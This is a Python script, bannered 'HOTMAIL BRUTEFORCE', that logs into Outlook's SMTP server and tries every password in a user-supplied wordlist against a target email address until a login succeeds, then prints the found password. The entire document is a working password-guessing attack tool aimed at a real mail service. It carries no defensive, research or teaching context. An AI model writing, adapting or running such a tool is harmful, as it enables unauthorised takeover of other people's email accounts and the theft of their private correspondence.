import smtplib, string, pyfiglet

class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'

class bruteforce:
    class banner:
        banner = pyfiglet.figlet_format("HOTMAIL BRUTEFORCE")
        print(banner)


    def brute(self):
        self.server = smtplib.SMTP("smtp-mail.outlook.com", 587)
        self.server.ehlo()
        self.server.starttls()

        self.username = input(bcolors.YELLOW + "[*] Enter the target email [*] \n-->")
        self.wordlist = input(bcolors.YELLOW + "[*] Enter the path that contains the wordlist [*] \n-->")
        print(bcolors.GREEN + "[+[+[  STARTING THE BRUTEFORCE... ]+]+]")
        self.f = open(self.wordlist, 'r')
        for password in self.f:
            self.password = password.strip("\n")
            try:
                self.server.login(self.username, self.password)
                print(bcolors.GREEN + f"[*] We found the password:{password}")
                break
            except smtplib.SMTPAuthenticationError:
                print(bcolors.RED + f"[*] wrong password: {password} ")

if __name__=='__main__':
    bforce = bruteforce()
    bforce.brute()

